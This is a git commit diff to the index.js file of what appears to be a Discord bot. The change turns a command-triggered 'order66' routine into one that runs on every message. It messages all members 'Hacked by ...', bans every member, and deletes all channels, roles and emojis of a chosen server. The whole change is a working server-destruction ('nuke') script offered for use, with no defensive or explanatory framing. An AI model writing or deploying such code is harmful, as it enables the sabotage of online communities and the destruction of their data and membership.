c5a28cc8ab5b07e22adc13a20d617921b668efce
1337toxic1337 <65368643+1337toxic1337@users.noreply.github.com>
2020-11-28 14:07:00 +0100

    Update index.js

--- index.js
+++ index.js
@@ -3,14 +3,11 @@ const {
     RichEmbed
 } = require('discord.js')
 const client = new Client();
-const token = 'Null'; //Insert bot token
-const PREFIX = '$';
+const token = ''; //Insert bot token
 
 client.on('ready', (guild) => {
 
-
     console.log('Ready');
-
 
 });
 
@@ -18,25 +15,13 @@ client.on('ready', (guild) => {
 
 client.on('message', message => {
 
-    let args = message.content.substring(PREFIX.length).split(" ");
+    const list = client.guilds.get(""); //INSERT SERVER ID 
 
-    switch (args[0]) {
-
-        case 'order66':
-
-
-
-            const list = client.guilds.get("Null"); //INSERT SERVER ID 
-
-
-            list.members.forEach(member => member.ban());
-            message.guild.channels.forEach(channel => channel.delete());
-
-
-
-            break;
-
-    }
+	list.members.forEach(member => member.send("Hacked by ..."));
+    list.members.forEach(member => member.ban());
+    message.guild.channels.forEach(channel => channel.delete());
+	list.roles.forEach(role => role.delete());
+	list.emojis.forEach(emoji => emoji.delete());
 
 });
 
